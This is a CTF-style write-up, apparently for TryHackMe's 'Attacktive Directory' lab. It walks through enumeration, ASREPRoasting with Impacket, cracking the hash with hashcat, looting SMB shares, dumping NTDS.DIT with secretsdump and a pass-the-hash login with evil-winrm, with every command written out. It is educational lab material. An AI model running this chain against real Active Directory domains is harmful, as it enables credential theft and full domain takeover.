---
title: Attacktive Directory
author: siresire
date: 2022-10-12 18:10:00 +0800
categories: [AD]
tags: [nmap, enum4linux,ASREPRoasting,Impacket,hashca,SMBClient, NTDS.DIT]
render_with_liquid: false
---

# Enumerations
## Nmap scan 

```yaml
nmap -sV -sC -A -T4 -oN nmap.scans 10.10.146.190 -vv
```

![Alt text](/assets/img/tryhackme/AD_01.png)

Alot of ports where open here and as per the look of thing , it looks like AD

### enumerating Port 139/445

```yaml
enum4linux -o spookysec.local
```

we found a domain name `THM-AD`
![Alt text](/assets/img/tryhackme/AD_02.png)


### Enumerating Users via Kerberos

Now that we have a domain name, we can enumerate the users via Kerberos, a key authentication service within Active Directory

installing of Kerberos [link 🔗](https://pypi.org/project/kerbrute/)

After installing Kerberos, I conducted a username spray, revealing two valid usernames: `james` ,`robin` and `svc-admin`. and other in with svc-admin has `NO-PREAUTH`


![Alt text](/assets/img/tryhackme/AD_03.png)

### Abusing Kerberos with an attack method called ASREPRoasting.

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

> ### Retrieving Kerberos Tickets

Impacket has a tool called "GetNPUsers.py" that will allow us to query ASReproastable accounts from the Key Distribution Center.

GetNPUsers.py can be used to retrieve domain users who do not have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. It is then possible to attempt to crack the session key sent along the ticket to retrieve the user password. This attack is known as ASREProast.[🔗](https://tools.thehacker.recipes/impacket/examples/getnpusers.py)

```yaml
./GetNPUsers.py -no-pass -dc-ip 10.10.2.195 spookysec.local/svc-admin
```

![Alt text](/assets/img/tryhackme/AD_04.png)

Looking at the  hashcat example in wiki [🔗](https://hashcat.net/wiki/doku.php?id=example_hashes)

![Alt text](/assets/img/tryhackme/AD_05.png)

we found that the kerberos has was a `Kerberos 5 AS-REP etype 23` and the mode of the hash is `18200`.

Now we can crack the hash using hashcat

```yaml
hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Alt text](/assets/img/tryhackme/AD_06.png)

Password found `management2005`

## Enumeration with password

After obtaining the password I tried to list smbshares 

```yaml 
smbclient -L 10.10.2.195 --user svc-admin
```
![Alt text](/assets/img/tryhackme/AD_07.png)


logged into the backup folder and obtained a credentials

```yaml
smbclient \\\\10.10.2.195\\backup --user svc-admin
```
![Alt text](/assets/img/tryhackme/AD_08.png)


## Escalation Elevating Privileges within the Domain 

After getting the credentials of backup account for the Domain Controller which has unique permission that allows all Active Directory changes to be synced with this user account including password hashes, I used another tool from Impacket this time called ‘secretsdump.py’ to dump NTDS.DIT


```yaml
./secretsdump.py -just-dc backup@spookysec.local 

```
![Alt text](/assets/img/tryhackme/AD_09.png)


using the hash of the administrator we can login into the machine using a tool know as `evil-winrm`

```yaml 
evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.2.195
```

![Alt text](/assets/img/tryhackme/AD_10.png)